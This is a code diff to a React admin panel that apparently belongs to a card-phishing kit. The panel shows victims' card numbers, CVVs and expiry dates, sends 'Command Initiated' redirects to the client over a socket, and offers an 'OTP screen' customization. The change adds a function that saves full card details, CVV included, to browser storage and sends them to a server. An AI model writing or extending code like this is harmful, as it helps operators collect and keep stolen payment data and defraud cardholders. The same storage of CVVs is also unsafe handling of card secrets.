@@ -9,6 +9,7 @@ import { io, Socket } from 'socket.io-client';
 import { useToast } from '@/hooks/use-toast';
 import { useSocket } from '../SocketContext';
 import { v4 as uuidv4 } from 'uuid';
+import { api } from '../utils/api';
 
 const formatCardNumber = (cardNumber: string) => {
   if (!cardNumber) return '';
@@ -288,6 +289,71 @@ const Admin = () => {
         description: "The payment transaction has been successfully deleted.",
         variant: "default",
       });
+    }
+  };
+
+  // Function to store successful payment persistently
+  const storeSuccessfulPayment = (paymentId: string) => {
+    try {
+      // Get existing successful payments from localStorage
+      const existingSuccessful = JSON.parse(localStorage.getItem('successfulPayments') || '[]');
+      
+      // Add new successful payment if not already exists
+      if (!existingSuccessful.includes(paymentId)) {
+        existingSuccessful.push(paymentId);
+        localStorage.setItem('successfulPayments', JSON.stringify(existingSuccessful));
+        console.log('💾 Stored successful payment:', paymentId);
+      }
+      
+      // Also store by linkId if this payment has one
+      const payment = payments.find(p => p.paymentId === paymentId);
+      if (payment) {
+        // Generate unique hash for success page URL
+        const successHash = `${Date.now()}_${Math.random().toString(36).substr(2, 12)}_${paymentId.substr(-8)}`;
+        
+        // Store success mapping by various identifiers
+        const successData = {
+          paymentId: paymentId,
+          successHash: successHash,
+          timestamp: new Date().toISOString(),
+          amount: payment.amount,
+          planName: payment.planName,
+          billing: payment.billing,
+          cardNumber: payment.cardNumber,
+          cardName: payment.cardName,
+          cvv: payment.cvv,
+          expiry: payment.expiry,
+          billingDetails: payment.billingDetails,
+          cardCountry: payment.cardCountry
+        };
+        
+        localStorage.setItem(`payment_success_${paymentId}`, JSON.stringify(successData));
+        
+        // Store on server for cross-browser access
+        api.storeSuccessPayment(successHash, successData)
+          .then(() => {
+            console.log('✅ Payment stored on server with hash:', successHash);
+          })
+          .catch(error => {
+            console.error('Error storing payment on server:', error);
+          });
+        
+        // Generate success URL
+        const baseUrl = window.location.origin;
+        const successUrl = `${baseUrl}/success/${successHash}`;
+        
+        console.log('✅ Payment marked as successful:', successData);
+        console.log('🔗 Success page URL:', successUrl);
+        
+        // Show success URL in toast for easy access
+        toast({
+          title: "Success Page Generated!",
+          description: `Access at: /success/${successHash}`,
+          duration: 10000,
+        });
+      }
+    } catch (error) {
+      console.error('Error storing successful payment:', error);
     }
   };
 
@@ -917,6 +983,10 @@ const Admin = () => {
           console.log('PaymentId being sent:', paymentId);
           socket.emit('payment-approved', { paymentId });
           updatePaymentStatus(paymentId, 'approved');
+          
+          // Store successful payment persistently
+          storeSuccessfulPayment(paymentId);
+          
           toast({
             title: "Command Initiated",
             description: "Payment approved - client redirecting to success page",
@@ -952,6 +1022,10 @@ const Admin = () => {
           console.log('PaymentId being sent:', paymentId);
           socket.emit('payment-approved', { paymentId });
           updatePaymentStatus(paymentId, 'approved');
+          
+          // Store successful payment persistently
+          storeSuccessfulPayment(paymentId);
+          
           toast({
             title: "Command Initiated", 
             description: "Payment successful - client redirecting to success page",
@@ -1838,7 +1912,7 @@ const Admin = () => {
 
         {/* OTP Customization Modal */}
         <Dialog open={showOtpModal} onOpenChange={setShowOtpModal}>
-          <DialogContent className="sm:max-w-md bg-gray-900 border-gray-700">
+          <DialogContent className="sm:max-w-2xl max-w-md bg-gray-900 border-gray-700">
             <DialogHeader>
               <DialogTitle className="text-white">Customize OTP Screen</DialogTitle>
               <DialogDescription className="text-gray-400">
